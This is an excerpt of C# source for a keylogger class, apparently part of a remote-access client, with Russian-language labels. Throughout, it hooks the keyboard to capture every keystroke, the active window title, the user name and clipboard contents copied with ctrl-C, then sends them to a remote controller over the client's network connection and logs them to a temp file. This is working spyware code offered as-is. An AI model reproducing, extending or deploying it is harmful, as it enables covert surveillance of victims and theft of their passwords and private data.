...
namespace Client.Helpers.Services
{
    public class Keylogger
    {
        ...
        public static string logName = Path.GetTempPath() + "KeyLoggerLogs.log";
        public static string lastTitle = "";
        public static string userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
        public static bool CurLang = InputLanguage.CurrentInputLanguage.Culture.EnglishName.StartsWith("Russian");
        ...
        private static IntPtr CallbackFunction(Int32 code, IntPtr wParam, IntPtr lParam)
        {
            ...
            try
            {
                ...
                if (code >= 0 && (msgType == 0x100 || msgType == 0x104))
                {
                    ...
                    short winState = GetAsyncKeyState(Keys.LWin);
                    short altState = GetAsyncKeyState(Keys.LMenu);
                    if ((shiftState & 0x8000) == 0x8000)
                    {
                        shift = true;
                    }
                    if ((altState & 0x8000) == 0x8000)
                    {
                        alt = true;
                    }
                    if ((winState & 0x8000) == 0x8000)
                    {
                        win = true;
                    }
                    ...
                    else if ((vKey >= 48 && vKey <= 62) || (vKey >= 186 && vKey <= 192))
                    {
                        if (shift)
                        {
                            switch (vKey)
                    ...
                    props["Key"] = key;
                    props["Time"] = DateTime.Now.ToString("dd/MM/yyyy HH:mm");
                    props["Window"] = title.ToString();
                    if (props["Window"] != lastTitle)
                    {
                        string titleString = Environment.NewLine + "----------------------------------------------" + Environment.NewLine +
                                                "Пользователь : " + userName + Environment.NewLine +
                                                "Окно : " + props["Window"] + Environment.NewLine +
                                                "Время : " + props["Time"] + Environment.NewLine +
                                                "----------------------------------------------" + Environment.NewLine;
                        //Console.WriteLine();
                        //Console.WriteLine();
                        ...
                        if (SendKeys)
                        {
                            ...
                            ToSend.AddRange(Encoding.UTF8.GetBytes(titleString));
                            Networking.Networking.MainClient.Send(ToSend.ToArray());
                            ToSend.Clear();
                            ToSend.Add((int)DataType.CurrentWindowType);
                            ToSend.AddRange(Encoding.UTF8.GetBytes(props["Window"] + " (" + DateTime.Now.ToString("HH:mm") + ")"));
                            Networking.Networking.MainClient.Send(ToSend.ToArray());
                        }
                        // Write to file
                    ...
                    if (SendKeys)
                    {
                        List<byte> ToSend = new List<byte>();
                        ToSend.Add((int)DataType.KeystrokeType);
                        ToSend.AddRange(Encoding.UTF8.GetBytes((props["Key"])));
                        Networking.Networking.MainClient.Send(ToSend.ToArray());
                    }
                    // log to file here
                }
        ...
        private static void InputLanguageManager_InputLanguageChanged(object sender, InputLanguageEventArgs e)
        {
                    ...
                    try
                    {
                        ...
                        if (m.Msg == NativeMethods.WM_CLIPBOARDUPDATE)
                        {
                            ...
                            if (active_window != IntPtr.Zero && active_window != null)
                            {
                                ...
                                try
                                {
                                    Trace.WriteLine("\t[cntrl-C] Буфер обмена : " + Clipboard.GetText());
                                    if (SendKeys)
                                    {
                                        List<byte> ToSend = new List<byte>();
                                        ToSend.Add((int)DataType.KeystrokeType);
                                        ToSend.AddRange(Encoding.UTF8.GetBytes((Environment.NewLine + "----------------------------------------------" + Environment.NewLine + 
                                            "[ctrl-C] Буфер обмена : " + Clipboard.GetText() + Environment.NewLine + "----------------------------------------------" + Environment.NewLine)));
                                        Networking.Networking.MainClient.Send(ToSend.ToArray());
                                    }
                                }
                                catch (Exception ex)
